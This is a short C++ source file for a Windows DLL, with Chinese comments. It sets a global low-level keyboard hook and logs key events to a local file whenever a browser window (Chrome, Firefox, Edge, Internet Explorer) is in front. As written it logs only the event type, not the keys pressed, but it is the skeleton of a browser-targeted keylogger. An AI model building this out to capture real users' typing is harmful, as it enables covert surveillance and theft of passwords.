// hook_dll.cpp
#include <windows.h>
#include <stdio.h>

HHOOK hKeyboardHook = NULL;

// 获取浏览器窗口标题的判断逻辑
bool IsBrowserWindow(HWND hwnd) {
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return strstr(title, "Chrome") || 
           strstr(title, "Firefox") || 
           strstr(title, "Edge") || 
           strstr(title, "Internet Explorer");
}

// 键盘钩子过程
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        HWND foreground = GetForegroundWindow();
        if (IsBrowserWindow(foreground)) {
            // 记录到日志文件
            FILE* log = fopen("browser_ops.log", "a");
            if (log) {
                fprintf(log, "Key event in browser: 0x%X\n", wParam);
                fclose(log);
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// 导出设置钩子的函数
extern "C" __declspec(dllexport) void InstallHook() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
}

// 导出卸载钩子的函数
extern "C" __declspec(dllexport) void UninstallHook() {
    UnhookWindowsHookEx(hKeyboardHook);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    return TRUE;
}